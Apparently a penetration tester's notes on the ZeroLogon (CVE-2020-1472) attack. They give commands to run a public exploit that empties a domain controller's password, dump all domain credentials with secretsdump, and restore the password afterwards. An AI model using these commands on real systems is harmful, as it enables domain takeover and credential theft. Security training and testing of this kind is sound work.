## Abusing ZeroLogon
- Super dangerous to run in an environment
- It attacks the DC, setting the password to Null, and taking over the DC
- When we run it, if we do not restore the password, the DC will break
- Attack details can get complex

### Attack
- Use the dirkjanm CVE-2020-1472 exploit
- Use the check tool to see if the DC is vulnerable
- Be super cautious, it would be really bad if you destroy a DC
- Run it: `python3 cve-2020-1472-exploit.py <dc name> <dc ip>`
- This sets the password to an empty string
- Check with empty password: `secretsdump.py -just-dc <domain>/<dc name>\$@<dc i>`
- Dumps all the data, DC is owned

### Restore
- Get cleartext password: `secretsdump.py administrator@<dc ip> -hashes <admin hash>`
- Find "plain password hex" and copy it
- Use the restore script: `python3 restorepassword.py <domain>/<dc name>@<dc name> -target-ip <dc ip> -hexpass <hexpass>`
- Should be good to go

DON'T KILL A DC
